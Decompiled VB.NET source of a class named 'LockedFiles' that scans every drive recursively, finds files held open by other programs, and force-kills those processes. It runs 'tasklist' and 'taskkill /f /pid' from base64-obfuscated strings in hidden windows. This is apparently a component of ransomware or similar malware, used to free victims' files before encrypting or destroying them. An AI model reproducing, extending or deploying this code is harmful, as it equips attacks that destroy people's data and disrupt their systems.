Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.IO
Imports System.Linq
Imports System.Text

Namespace Complex
	' Token: 0x02000005 RID: 5
	Friend Class LockedFiles
		' Token: 0x0600001F RID: 31 RVA: 0x000068D8 File Offset: 0x00004AD8
		Public Shared Sub ReleaseLockedFiles()
			Try
				For Each driveInfo As DriveInfo In DriveInfo.GetDrives()
					If driveInfo.IsReady Then
						LockedFiles.RecursiveReleaseFiles(driveInfo.Name)
					End If
				Next
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000020 RID: 32 RVA: 0x00006968 File Offset: 0x00004B68
		Public Shared Sub RecursiveReleaseFiles(path As String)
			Try
				Dim directoryInfo As DirectoryInfo = New DirectoryInfo(path)
				For Each fileInfo As FileInfo In directoryInfo.GetFiles()
					Try
						LockedFiles.GeneralFilesList.Add(fileInfo.FullName)
					Catch ex As UnauthorizedAccessException
					End Try
				Next
				For Each directoryInfo2 As DirectoryInfo In directoryInfo.GetDirectories()
					Try
						LockedFiles.RecursiveReleaseFiles(directoryInfo2.FullName)
					Catch ex2 As UnauthorizedAccessException
					End Try
				Next
			Catch
			End Try
			If LockedFiles.GeneralFilesList.Count > 0 Then
				For Each item As String In LockedFiles.GeneralFilesList.Where(Function(text As String) LockedFiles.Islocked(text))
					LockedFiles.OpenFilesList.Add(item)
				Next
				LockedFiles.GeneralFilesList.Clear()
				If LockedFiles.OpenFilesList.Count > 0 Then
					For Each fileInfo As FileInfo In LockedFiles.OpenFilesList.[Select](Function(text2 As String) New FileInfo(text2))
						LockedFiles.Killproc(fileInfo.Name)
					Next
				End If
			End If
		End Sub

		' Token: 0x06000021 RID: 33 RVA: 0x00006B58 File Offset: 0x00004D58
		Public Shared Function Islocked(fileName As String) As Boolean
			Dim fileStream As FileStream = Nothing
			Try
				fileStream = File.Open(fileName, FileMode.Open, FileAccess.ReadWrite, FileShare.None)
			Catch ex As UnauthorizedAccessException
				Try
					fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.None)
				Catch ex2 As Exception
					Return True
				End Try
			Catch ex3 As Exception
				Return True
			Finally
				fileStream.Close()
			End Try
			Return False
		End Function

		' Token: 0x06000022 RID: 34 RVA: 0x00006C50 File Offset: 0x00004E50
		Public Shared Sub Killproc(filename As String)
			Try
				Dim text As String = LockedFiles.proc_exe(Program.Base64Decode("dGFza2xpc3Q="), Program.Base64Decode("L3YgL2ZvIGNzdg=="))
				Dim separator As String() = New String() { vbCrLf }
				Dim source As String() = text.Split(separator, StringSplitOptions.None)
				Dim list As List(Of String) = source.Where(Function(t As String) t.Contains(filename)).[Select](Function(t As String) t.Split(New Char() { ","c })).[Select](Function(array2 As String()) array2(1).Replace("""", "")).ToList()
				For Each str As String In list
					LockedFiles.proc_exe(Program.Base64Decode("dGFza2tpbGw="), Program.Base64Decode("L2YgL3BpZCA=") + str)
				Next
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000023 RID: 35 RVA: 0x00006D90 File Offset: 0x00004F90
		Public Shared Function proc_exe(file As String, arg As String) As String
			Dim result As String
			Try
				Dim process As Process = Process.Start(New ProcessStartInfo(file, arg) With { .RedirectStandardOutput = True, .RedirectStandardError = True, .StandardOutputEncoding = Encoding.GetEncoding("UTF-8"), .WindowStyle = ProcessWindowStyle.Hidden, .UseShellExecute = False, .CreateNoWindow = True })
				Dim str As String
				Using standardOutput As StreamReader = process.StandardOutput
					str = standardOutput.ReadToEnd()
				End Using
				Dim str2 As String
				Using standardError As StreamReader = process.StandardError
					str2 = standardError.ReadToEnd()
				End Using
				process.WaitForExit()
				result = str2 + str
			Catch ex As Exception
				result = ex.Message + vbLf & "<------------>" & vbLf + ex.StackTrace
			End Try
			Return result
		End Function

		' Token: 0x0400004F RID: 79
		Public Shared GeneralFilesList As List(Of String) = New List(Of String)()

		' Token: 0x04000050 RID: 80
		Public Shared OpenFilesList As List(Of String) = New List(Of String)()
	End Class
End Namespace
